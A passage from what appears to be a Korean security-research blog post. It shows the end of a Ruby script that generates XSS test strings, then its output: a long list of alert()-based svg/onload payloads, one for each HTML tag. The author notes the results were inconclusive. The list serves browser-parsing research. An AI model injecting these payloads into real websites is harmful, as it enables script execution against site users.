+arr<span class="hljs-operator">.</span>each <span class="hljs-keyword">do</span> <span class="hljs-operator">|</span>payload<span class="hljs-operator">|</span>
+  pp <span class="hljs-operator">=</span> payload<span class="hljs-operator">.</span>split<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;&gt;&#39;</span><span class="hljs-punctuation">)</span>
+  payload <span class="hljs-operator">=</span> payload<span class="hljs-operator">.</span>gsub<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;#{endtag}&#39;</span><span class="hljs-punctuation">,</span> pp<span class="hljs-operator">[</span><span class="hljs-number">0</span><span class="hljs-operator">]</span><span class="hljs-operator">[</span><span class="hljs-number">1</span><span class="hljs-operator">..</span><span class="hljs-operator">-</span><span class="hljs-number">1</span><span class="hljs-operator">]</span><span class="hljs-punctuation">)</span>
+  payload <span class="hljs-operator">=</span> payload<span class="hljs-operator">.</span>gsub<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;#{starttag}&#39;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;</span><span class="hljs-string">&#39;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">+</span>pp<span class="hljs-operator">[</span><span class="hljs-number">0</span><span class="hljs-operator">]</span><span class="hljs-operator">[</span><span class="hljs-number">1</span><span class="hljs-operator">..</span><span class="hljs-operator">-</span><span class="hljs-number">1</span><span class="hljs-operator">]</span><span class="hljs-operator">.</span>to_s<span class="hljs-operator">+</span><span class="hljs-string">&quot;</span><span class="hljs-string">&#39;</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">)</span>
+  <span class="hljs-built_in">p</span> payload
+<span class="hljs-keyword">end</span>
+
+</code></pre>
+<p>이렇게 HTML 태그 리스트로 뽑아낼 수 있습니다. 여기서 중점은 한번에 테스트 시 DOM이 깨져서 제대로된 결과를 얻을 수 없습니다. 셀리니움끼고 구현해서 정확한 값을 얻어와야겠네요. (다음시간에 할래요 귀찮…)
+output</p>
+<pre><code>&lt;a&gt;&lt;p title=&quot;&lt;/a&gt;&lt;svg/onload=alert('a')&gt;&quot;&gt;
+&lt;abbr&gt;&lt;p title=&quot;&lt;/abbr&gt;&lt;svg/onload=alert('abbr')&gt;&quot;&gt;
+&lt;acronym&gt;&lt;p title=&quot;&lt;/acronym&gt;&lt;svg/onload=alert('acronym')&gt;&quot;&gt;
+&lt;address&gt;&lt;p title=&quot;&lt;/address&gt;&lt;svg/onload=alert('address')&gt;&quot;&gt;
+&lt;applet&gt;&lt;p title=&quot;&lt;/applet&gt;&lt;svg/onload=alert('applet')&gt;&quot;&gt;
+&lt;area&gt;&lt;p title=&quot;&lt;/area&gt;&lt;svg/onload=alert('area')&gt;&quot;&gt;
+&lt;article&gt;&lt;p title=&quot;&lt;/article&gt;&lt;svg/onload=alert('article')&gt;&quot;&gt;
+&lt;aside&gt;&lt;p title=&quot;&lt;/aside&gt;&lt;svg/onload=alert('aside')&gt;&quot;&gt;
+&lt;audio&gt;&lt;p title=&quot;&lt;/audio&gt;&lt;svg/onload=alert('audio')&gt;&quot;&gt;
+&lt;b&gt;&lt;p title=&quot;&lt;/b&gt;&lt;svg/onload=alert('b')&gt;&quot;&gt;
+&lt;base&gt;&lt;p title=&quot;&lt;/base&gt;&lt;svg/onload=alert('base')&gt;&quot;&gt;
+&lt;basefont&gt;&lt;p title=&quot;&lt;/basefont&gt;&lt;svg/onload=alert('basefont')&gt;&quot;&gt;
+&lt;bdi&gt;&lt;p title=&quot;&lt;/bdi&gt;&lt;svg/onload=alert('bdi')&gt;&quot;&gt;
+&lt;bdo&gt;&lt;p title=&quot;&lt;/bdo&gt;&lt;svg/onload=alert('bdo')&gt;&quot;&gt;
+&lt;bgsound&gt;&lt;p title=&quot;&lt;/bgsound&gt;&lt;svg/onload=alert('bgsound')&gt;&quot;&gt;
+&lt;big&gt;&lt;p title=&quot;&lt;/big&gt;&lt;svg/onload=alert('big')&gt;&quot;&gt;
+&lt;blink&gt;&lt;p title=&quot;&lt;/blink&gt;&lt;svg/onload=alert('blink')&gt;&quot;&gt;
+&lt;blockquote&gt;&lt;p title=&quot;&lt;/blockquote&gt;&lt;svg/onload=alert('blockquote')&gt;&quot;&gt;
+&lt;body&gt;&lt;p title=&quot;&lt;/body&gt;&lt;svg/onload=alert('body')&gt;&quot;&gt;
+&lt;br&gt;&lt;p title=&quot;&lt;/br&gt;&lt;svg/onload=alert('br')&gt;&quot;&gt;
+&lt;button&gt;&lt;p title=&quot;&lt;/button&gt;&lt;svg/onload=alert('button')&gt;&quot;&gt;
+&lt;canvas&gt;&lt;p title=&quot;&lt;/canvas&gt;&lt;svg/onload=alert('canvas')&gt;&quot;&gt;
+&lt;caption&gt;&lt;p title=&quot;&lt;/caption&gt;&lt;svg/onload=alert('caption')&gt;&quot;&gt;
+&lt;center&gt;&lt;p title=&quot;&lt;/center&gt;&lt;svg/onload=alert('center')&gt;&quot;&gt;
+&lt;cite&gt;&lt;p title=&quot;&lt;/cite&gt;&lt;svg/onload=alert('cite')&gt;&quot;&gt;
+&lt;code&gt;&lt;p title=&quot;&lt;/code&gt;&lt;svg/onload=alert('code')&gt;&quot;&gt;
+&lt;col&gt;&lt;p title=&quot;&lt;/col&gt;&lt;svg/onload=alert('col')&gt;&quot;&gt;
+&lt;colgroup&gt;&lt;p title=&quot;&lt;/colgroup&gt;&lt;svg/onload=alert('colgroup')&gt;&quot;&gt;
+&lt;content&gt;&lt;p title=&quot;&lt;/content&gt;&lt;svg/onload=alert('content')&gt;&quot;&gt;
+&lt;data&gt;&lt;p title=&quot;&lt;/data&gt;&lt;svg/onload=alert('data')&gt;&quot;&gt;
+&lt;datalist&gt;&lt;p title=&quot;&lt;/datalist&gt;&lt;svg/onload=alert('datalist')&gt;&quot;&gt;
+&lt;dd&gt;&lt;p title=&quot;&lt;/dd&gt;&lt;svg/onload=alert('dd')&gt;&quot;&gt;
+&lt;del&gt;&lt;p title=&quot;&lt;/del&gt;&lt;svg/onload=alert('del')&gt;&quot;&gt;
+&lt;details&gt;&lt;p title=&quot;&lt;/details&gt;&lt;svg/onload=alert('details')&gt;&quot;&gt;
+&lt;dfn&gt;&lt;p title=&quot;&lt;/dfn&gt;&lt;svg/onload=alert('dfn')&gt;&quot;&gt;
+&lt;dialog&gt;&lt;p title=&quot;&lt;/dialog&gt;&lt;svg/onload=alert('dialog')&gt;&quot;&gt;
+&lt;dir&gt;&lt;p title=&quot;&lt;/dir&gt;&lt;svg/onload=alert('dir')&gt;&quot;&gt;
+&lt;div&gt;&lt;p title=&quot;&lt;/div&gt;&lt;svg/onload=alert('div')&gt;&quot;&gt;
+&lt;dl&gt;&lt;p title=&quot;&lt;/dl&gt;&lt;svg/onload=alert('dl')&gt;&quot;&gt;
+&lt;dt&gt;&lt;p title=&quot;&lt;/dt&gt;&lt;svg/onload=alert('dt')&gt;&quot;&gt;
+&lt;em&gt;&lt;p title=&quot;&lt;/em&gt;&lt;svg/onload=alert('em')&gt;&quot;&gt;
+&lt;embed&gt;&lt;p title=&quot;&lt;/embed&gt;&lt;svg/onload=alert('embed')&gt;&quot;&gt;
+&lt;fieldset&gt;&lt;p title=&quot;&lt;/fieldset&gt;&lt;svg/onload=alert('fieldset')&gt;&quot;&gt;
+&lt;figcaption&gt;&lt;p title=&quot;&lt;/figcaption&gt;&lt;svg/onload=alert('figcaption')&gt;&quot;&gt;
+&lt;figure&gt;&lt;p title=&quot;&lt;/figure&gt;&lt;svg/onload=alert('figure')&gt;&quot;&gt;
+&lt;font&gt;&lt;p title=&quot;&lt;/font&gt;&lt;svg/onload=alert('font')&gt;&quot;&gt;
+&lt;footer&gt;&lt;p title=&quot;&lt;/footer&gt;&lt;svg/onload=alert('footer')&gt;&quot;&gt;
+&lt;form&gt;&lt;p title=&quot;&lt;/form&gt;&lt;svg/onload=alert('form')&gt;&quot;&gt;
+&lt;frame&gt;&lt;p title=&quot;&lt;/frame&gt;&lt;svg/onload=alert('frame')&gt;&quot;&gt;
+&lt;frameset&gt;&lt;p title=&quot;&lt;/frameset&gt;&lt;svg/onload=alert('frameset')&gt;&quot;&gt;
+&lt;h1&gt;&lt;p title=&quot;&lt;/h1&gt;&lt;svg/onload=alert('h1')&gt;&quot;&gt;
+&lt;h2&gt;&lt;p title=&quot;&lt;/h2&gt;&lt;svg/onload=alert('h2')&gt;&quot;&gt;
+&lt;h3&gt;&lt;p title=&quot;&lt;/h3&gt;&lt;svg/onload=alert('h3')&gt;&quot;&gt;
+&lt;h4&gt;&lt;p title=&quot;&lt;/h4&gt;&lt;svg/onload=alert('h4')&gt;&quot;&gt;
+&lt;h5&gt;&lt;p title=&quot;&lt;/h5&gt;&lt;svg/onload=alert('h5')&gt;&quot;&gt;
+&lt;h6&gt;&lt;p title=&quot;&lt;/h6&gt;&lt;svg/onload=alert('h6')&gt;&quot;&gt;
+&lt;head&gt;&lt;p title=&quot;&lt;/head&gt;&lt;svg/onload=alert('head')&gt;&quot;&gt;
+&lt;header&gt;&lt;p title=&quot;&lt;/header&gt;&lt;svg/onload=alert('header')&gt;&quot;&gt;
+&lt;hgroup&gt;&lt;p title=&quot;&lt;/hgroup&gt;&lt;svg/onload=alert('hgroup')&gt;&quot;&gt;
+&lt;hr&gt;&lt;p title=&quot;&lt;/hr&gt;&lt;svg/onload=alert('hr')&gt;&quot;&gt;
+&lt;html&gt;&lt;p title=&quot;&lt;/html&gt;&lt;svg/onload=alert('html')&gt;&quot;&gt;
+&lt;i&gt;&lt;p title=&quot;&lt;/i&gt;&lt;svg/onload=alert('i')&gt;&quot;&gt;
+&lt;iframe&gt;&lt;p title=&quot;&lt;/iframe&gt;&lt;svg/onload=alert('iframe')&gt;&quot;&gt;
+&lt;img&gt;&lt;p title=&quot;&lt;/img&gt;&lt;svg/onload=alert('img')&gt;&quot;&gt;
+&lt;input&gt;&lt;p title=&quot;&lt;/input&gt;&lt;svg/onload=alert('input')&gt;&quot;&gt;
+&lt;ins&gt;&lt;p title=&quot;&lt;/ins&gt;&lt;svg/onload=alert('ins')&gt;&quot;&gt;
+&lt;isindex&gt;&lt;p title=&quot;&lt;/isindex&gt;&lt;svg/onload=alert('isindex')&gt;&quot;&gt;
+&lt;kbd&gt;&lt;p title=&quot;&lt;/kbd&gt;&lt;svg/onload=alert('kbd')&gt;&quot;&gt;
+&lt;keygen&gt;&lt;p title=&quot;&lt;/keygen&gt;&lt;svg/onload=alert('keygen')&gt;&quot;&gt;
+&lt;label&gt;&lt;p title=&quot;&lt;/label&gt;&lt;svg/onload=alert('label')&gt;&quot;&gt;
+&lt;legend&gt;&lt;p title=&quot;&lt;/legend&gt;&lt;svg/onload=alert('legend')&gt;&quot;&gt;
+&lt;li&gt;&lt;p title=&quot;&lt;/li&gt;&lt;svg/onload=alert('li')&gt;&quot;&gt;
+&lt;link&gt;&lt;p title=&quot;&lt;/link&gt;&lt;svg/onload=alert('link')&gt;&quot;&gt;
+&lt;listing&gt;&lt;p title=&quot;&lt;/listing&gt;&lt;svg/onload=alert('listing')&gt;&quot;&gt;
+&lt;main&gt;&lt;p title=&quot;&lt;/main&gt;&lt;svg/onload=alert('main')&gt;&quot;&gt;
+&lt;map&gt;&lt;p title=&quot;&lt;/map&gt;&lt;svg/onload=alert('map')&gt;&quot;&gt;
+&lt;mark&gt;&lt;p title=&quot;&lt;/mark&gt;&lt;svg/onload=alert('mark')&gt;&quot;&gt;
+&lt;marquee&gt;&lt;p title=&quot;&lt;/marquee&gt;&lt;svg/onload=alert('marquee')&gt;&quot;&gt;
+&lt;menu&gt;&lt;p title=&quot;&lt;/menu&gt;&lt;svg/onload=alert('menu')&gt;&quot;&gt;
+&lt;menuitem&gt;&lt;p title=&quot;&lt;/menuitem&gt;&lt;svg/onload=alert('menuitem')&gt;&quot;&gt;
+&lt;meta&gt;&lt;p title=&quot;&lt;/meta&gt;&lt;svg/onload=alert('meta')&gt;&quot;&gt;
+&lt;meter&gt;&lt;p title=&quot;&lt;/meter&gt;&lt;svg/onload=alert('meter')&gt;&quot;&gt;
+&lt;nav&gt;&lt;p title=&quot;&lt;/nav&gt;&lt;svg/onload=alert('nav')&gt;&quot;&gt;
+&lt;nobr&gt;&lt;p title=&quot;&lt;/nobr&gt;&lt;svg/onload=alert('nobr')&gt;&quot;&gt;
+&lt;noframes&gt;&lt;p title=&quot;&lt;/noframes&gt;&lt;svg/onload=alert('noframes')&gt;&quot;&gt;
+&lt;noscript&gt;&lt;p title=&quot;&lt;/noscript&gt;&lt;svg/onload=alert('noscript')&gt;&quot;&gt;
+&lt;object&gt;&lt;p title=&quot;&lt;/object&gt;&lt;svg/onload=alert('object')&gt;&quot;&gt;
+&lt;ol&gt;&lt;p title=&quot;&lt;/ol&gt;&lt;svg/onload=alert('ol')&gt;&quot;&gt;
+&lt;optgroup&gt;&lt;p title=&quot;&lt;/optgroup&gt;&lt;svg/onload=alert('optgroup')&gt;&quot;&gt;
+&lt;option&gt;&lt;p title=&quot;&lt;/option&gt;&lt;svg/onload=alert('option')&gt;&quot;&gt;
+&lt;output&gt;&lt;p title=&quot;&lt;/output&gt;&lt;svg/onload=alert('output')&gt;&quot;&gt;
+&lt;p&gt;&lt;p title=&quot;&lt;/p&gt;&lt;svg/onload=alert('p')&gt;&quot;&gt;
+&lt;param&gt;&lt;p title=&quot;&lt;/param&gt;&lt;svg/onload=alert('param')&gt;&quot;&gt;
+&lt;picture&gt;&lt;p title=&quot;&lt;/picture&gt;&lt;svg/onload=alert('picture')&gt;&quot;&gt;
+&lt;plaintext&gt;&lt;p title=&quot;&lt;/plaintext&gt;&lt;svg/onload=alert('plaintext')&gt;&quot;&gt;
+&lt;pre&gt;&lt;p title=&quot;&lt;/pre&gt;&lt;svg/onload=alert('pre')&gt;&quot;&gt;
+&lt;progress&gt;&lt;p title=&quot;&lt;/progress&gt;&lt;svg/onload=alert('progress')&gt;&quot;&gt;
+&lt;q&gt;&lt;p title=&quot;&lt;/q&gt;&lt;svg/onload=alert('q')&gt;&quot;&gt;
+&lt;rp&gt;&lt;p title=&quot;&lt;/rp&gt;&lt;svg/onload=alert('rp')&gt;&quot;&gt;
+&lt;rt&gt;&lt;p title=&quot;&lt;/rt&gt;&lt;svg/onload=alert('rt')&gt;&quot;&gt;
+&lt;rtc&gt;&lt;p title=&quot;&lt;/rtc&gt;&lt;svg/onload=alert('rtc')&gt;&quot;&gt;
+&lt;ruby&gt;&lt;p title=&quot;&lt;/ruby&gt;&lt;svg/onload=alert('ruby')&gt;&quot;&gt;
+&lt;s&gt;&lt;p title=&quot;&lt;/s&gt;&lt;svg/onload=alert('s')&gt;&quot;&gt;
+&lt;samp&gt;&lt;p title=&quot;&lt;/samp&gt;&lt;svg/onload=alert('samp')&gt;&quot;&gt;
+&lt;script&gt;&lt;p title=&quot;&lt;/script&gt;&lt;svg/onload=alert('script')&gt;&quot;&gt;
+&lt;section&gt;&lt;p title=&quot;&lt;/section&gt;&lt;svg/onload=alert('section')&gt;&quot;&gt;
+&lt;select&gt;&lt;p title=&quot;&lt;/select&gt;&lt;svg/onload=alert('select')&gt;&quot;&gt;
+&lt;shadow&gt;&lt;p title=&quot;&lt;/shadow&gt;&lt;svg/onload=alert('shadow')&gt;&quot;&gt;
+&lt;slot&gt;&lt;p title=&quot;&lt;/slot&gt;&lt;svg/onload=alert('slot')&gt;&quot;&gt;
+&lt;small&gt;&lt;p title=&quot;&lt;/small&gt;&lt;svg/onload=alert('small')&gt;&quot;&gt;
+&lt;source&gt;&lt;p title=&quot;&lt;/source&gt;&lt;svg/onload=alert('source')&gt;&quot;&gt;
+&lt;spacer&gt;&lt;p title=&quot;&lt;/spacer&gt;&lt;svg/onload=alert('spacer')&gt;&quot;&gt;
+&lt;span&gt;&lt;p title=&quot;&lt;/span&gt;&lt;svg/onload=alert('span')&gt;&quot;&gt;
+&lt;strike&gt;&lt;p title=&quot;&lt;/strike&gt;&lt;svg/onload=alert('strike')&gt;&quot;&gt;
+&lt;strong&gt;&lt;p title=&quot;&lt;/strong&gt;&lt;svg/onload=alert('strong')&gt;&quot;&gt;
+&lt;style&gt;&lt;p title=&quot;&lt;/style&gt;&lt;svg/onload=alert('style')&gt;&quot;&gt;
+&lt;sub&gt;&lt;p title=&quot;&lt;/sub&gt;&lt;svg/onload=alert('sub')&gt;&quot;&gt;
+&lt;summary&gt;&lt;p title=&quot;&lt;/summary&gt;&lt;svg/onload=alert('summary')&gt;&quot;&gt;
+&lt;sup&gt;&lt;p title=&quot;&lt;/sup&gt;&lt;svg/onload=alert('sup')&gt;&quot;&gt;
+&lt;table&gt;&lt;p title=&quot;&lt;/table&gt;&lt;svg/onload=alert('table')&gt;&quot;&gt;
+&lt;tbody&gt;&lt;p title=&quot;&lt;/tbody&gt;&lt;svg/onload=alert('tbody')&gt;&quot;&gt;
+&lt;td&gt;&lt;p title=&quot;&lt;/td&gt;&lt;svg/onload=alert('td')&gt;&quot;&gt;
+&lt;template&gt;&lt;p title=&quot;&lt;/template&gt;&lt;svg/onload=alert('template')&gt;&quot;&gt;
+&lt;textarea&gt;&lt;p title=&quot;&lt;/textarea&gt;&lt;svg/onload=alert('textarea')&gt;&quot;&gt;
+&lt;tfoot&gt;&lt;p title=&quot;&lt;/tfoot&gt;&lt;svg/onload=alert('tfoot')&gt;&quot;&gt;
+&lt;th&gt;&lt;p title=&quot;&lt;/th&gt;&lt;svg/onload=alert('th')&gt;&quot;&gt;
+&lt;thead&gt;&lt;p title=&quot;&lt;/thead&gt;&lt;svg/onload=alert('thead')&gt;&quot;&gt;
+&lt;time&gt;&lt;p title=&quot;&lt;/time&gt;&lt;svg/onload=alert('time')&gt;&quot;&gt;
+&lt;title&gt;&lt;p title=&quot;&lt;/title&gt;&lt;svg/onload=alert('title')&gt;&quot;&gt;
+&lt;tr&gt;&lt;p title=&quot;&lt;/tr&gt;&lt;svg/onload=alert('tr')&gt;&quot;&gt;
+&lt;track&gt;&lt;p title=&quot;&lt;/track&gt;&lt;svg/onload=alert('track')&gt;&quot;&gt;
+&lt;tt&gt;&lt;p title=&quot;&lt;/tt&gt;&lt;svg/onload=alert('tt')&gt;&quot;&gt;
+&lt;u&gt;&lt;p title=&quot;&lt;/u&gt;&lt;svg/onload=alert('u')&gt;&quot;&gt;
+&lt;ul&gt;&lt;p title=&quot;&lt;/ul&gt;&lt;svg/onload=alert('ul')&gt;&quot;&gt;
+&lt;var&gt;&lt;p title=&quot;&lt;/var&gt;&lt;svg/onload=alert('var')&gt;&quot;&gt;
+&lt;video&gt;&lt;p title=&quot;&lt;/video&gt;&lt;svg/onload=alert('video')&gt;&quot;&gt;
+&lt;wbr&gt;&lt;p title=&quot;&lt;/wbr&gt;&lt;svg/onload=alert('wbr')&gt;&quot;&gt;
+&lt;xmp&gt;&lt;p title=&quot;&lt;/xmp&gt;&lt;svg/onload=alert('xmp')&gt;&quot;&gt;
+</code></pre>
+<p>특별히 더 나온건 없었네요 😩</p>
+<p><img loading="lazy" src="https://3.bp.blogspot.com/-mYrFjy_cq9A/XLCnqRe_bBI/AAAAAAAAD-o/tGpH34JWWt01mAIwLtF-x96IqzhOuylHACLcBGAs/s1600/1415.png" alt="" /></p>
+</div>
+
+        <div class="footnotes-area"></div>
+
+        
+            
+            
+                
+                
+                
+                
+                
+                
+                
+                
+            
+        
+    </article>
+
+    
+</div>
+
+            </div>
+        </main>
+
+        <footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <span class="hw-mark footer-mark" aria-hidden="true"></span>
+            <nav class="footer-menu" aria-label="Footer">
+                <a href="/tags/">TAGS</a>
+                <a href="/about/uses/">USES</a>
+                <a href="/contact/">CONTACT</a>
+                <a href="/feeds/">FEEDS</a>
+                <a href="/privacy/">PRIVACY</a>
+            </nav>
+            <div class="socials">
+                <a
+                    href="https://github.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="GitHub"
+                    aria-label="GitHub"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://x.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="X"
+                    aria-label="X (Twitter)"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://www.instagram.com/hahwul_"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="Instagram"
+                    aria-label="Instagram"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"
+                        /></svg
+                ></a>
+            </div>
+            <p>Developed and Designed by Me<br />2026 HAHWUL.</p>
+        </div>
+    </div>
+</footer>
+        <div
+    class="search-overlay"
+    data-search-overlay
+    data-search-index="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/search_index.json"
+    data-search-empty="Type to search posts, notes, projects and the archive."
+    data-search-no-results="No results found."
+    data-search-loading="Loading index"
+    data-search-error="Unable to load search index. Refresh and try again."
+    aria-hidden="true"
+>
+    <div class="search-panel" role="dialog" aria-modal="true" aria-label="Search">
+        <div class="search-header">
+            <div class="search-input-wrapper">
+                <input
+                    type="search"
+                    name="search"
+                    placeholder="Search the site, #tag to filter"
+                    aria-label="Search the site"
+                    autocomplete="off"
+                    spellcheck="false"
+                    data-search-input
+                >
+            </div>
+            <div class="search-meta">
+                <span class="search-shortcut" data-search-key>⌘K</span>
+                <button class="search-close" type="button" data-search-close aria-label="Close search">
+                    Esc
+                </button>
+            </div>
+        </div>
+        <div class="search-filters" data-search-filters>
+            <div class="search-filter-group" role="group" aria-label="Filter by type" data-filter-group="type">
+                <button type="button" class="search-chip is-active" data-filter-type="all" aria-pressed="true">All<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="post" aria-pressed="false">Posts<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="note" aria-pressed="false">Notes<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="project" aria-pressed="false">Projects<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="archive" aria-pressed="false">Archive<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="page" aria-pressed="false">Pages<span class="search-chip-count" data-chip-count></span></button>
+            </div>
+            <div class="search-filter-group search-filter-group--lang" role="group" aria-label="Filter by language" data-filter-group="lang">
+                <button type="button" class="search-chip is-active" data-filter-lang="all" aria-pressed="true">All</button>
+                <button type="button" class="search-chip" data-filter-lang="en" aria-pressed="false">EN</button>
+                <button type="button" class="search-chip" data-filter-lang="ko" aria-pressed="false">KO</button>
+            </div>
+        </div>
+        <div class="search-status" data-search-status></div>
+        <div class="search-results" data-search-results aria-live="polite">
+            <p class="search-empty" data-search-empty>Type to search posts, notes, projects and the archive.</p>
+        </div>
+    </div>
+</div>
+    </div>
+
+    
+    
+
+    
+    <script src="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/app.1881a2e0.js" defer></script>
+</body>
+
+</html>
